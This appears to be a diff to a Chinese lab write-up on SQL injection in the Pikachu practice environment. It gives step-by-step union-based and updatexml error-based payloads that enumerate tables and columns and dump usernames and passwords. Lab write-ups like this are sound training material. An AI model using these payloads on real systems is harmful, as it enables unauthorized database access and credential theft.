@@ -104,13 +104,67 @@ SQL注入就是指Web应用程序对用户输入数据的合法性没有判断�
 
 >**查看Pikachu的后台源码，发现搜索型注入和字符型注入的差别在于输入参数的闭合方式，字符型为`'name'`,搜索型为`'%name%'`,不过在注入过程中发现其payload构造方式与字符型相同，因为在构造时加入`1'`闭合前面的单引号之后，引号内部的 % 也被闭合掉了，所以不会产生影响。**
 
-1.
+1.输入`1'`报错，输入`1'#`返回正常
 
+![D$ZI5){)R3%}C332N}9}}~9.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/D%24ZI5)%7B)R3%25%7DC332N%7D9%7D%7D%7E9.png)
 
+![WSNH81ZS7$7{6QT(W9V(MJU.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/WSNH81ZS7%247%7B6QT(W9V(MJU.png)
 
+2.用 order by 判断列数`1' order by 4#`
 
+![HMUGZ(FQTHL9QA$]H@IZE4C.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/HMUGZ(FQTHL9QA%24%5DH%40IZE4C.png)
 
+3.union看回显`-1' union select 1,2,3#`
 
+![BTF_4TN87CJHCWC{71(Y65S.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/BTF_4TN87CJHCWC%7B71(Y65S.png)
+
+4.爆库名`-1' union select 1,database(),3#`
+
+![QQ图片20200305124300.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305124300.png)
+
+5.爆表名`-1' union select 1,(select table_name from information_schema.tables where table_schema='pikachu' limit 3,1),3#`
+
+![QQ图片20200305124400.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305124400.png)
+
+6.爆列名`-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='pikachu' and table_name='users'),3#`
+
+![_HS%PDJM}GKG8MAKR}Q`)D4.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/_HS%25PDJM%7DGKG8MAKR%7DQ%60)D4.png)
+
+7.查看username字段`-1' union select 1,(select group_concat(username) from pikachu.users),3#`
+
+![QQ图片20200305124544.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305124544.png)
+
+8.查看password字段`-1' union select 1,(select group_concat(password) from pikachu.users),3#`
+
+![QQ图片20200305124710.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305124710.png)
+
+### 五、xx型注入
+
+>**xx型注入的后台源码显示闭合方式为`('name')`,用union注入方法和之前的字符型注入、搜索型注入原理相通，只是在闭合的地方用`')`进行闭合就可以了。为加深对报错注入的理解，所以此处改用报错注入的方法来做**
+
+1.输入`1')`报错，输入`1')#`返回正常
+
+![ZLYA9Z)Y4W$PZ8AY$8ML5XE.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/ZLYA9Z)Y4W%24PZ8AY%248ML5XE.png)
+
+![QQ图片20200305125820.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305125820.png)
+
+2.用`updatexml()`函数进行数据库报错:`1') and updatexml(1,concat(0x7e,database(),0x7e),1)#`
+
+![QQ图片20200305125948.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305125948.png)
+
+3.爆表`-1') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='pikachu'),0x7e),1)#`
+
+![QQ图片20200305130122.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305130122.png)
+
+4.爆列名`-1') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='pikachu' and table_name='users'),0x7e),1)#`
+
+![KXM(4JDV}@Q{}7CWL]Q%EEF.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/KXM(4JDV%7D%40Q%7B%7D7CWL%5DQ%25EEF.png)
+
+5.爆字段`-1') and updatexml(1,concat(0x7e,(select group_concat(username) from pikachu.users),0x7e),1)#`
+
+![QQ图片20200305130352.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305130352.png)
+
+### 六、insert/update注入
 
 
 
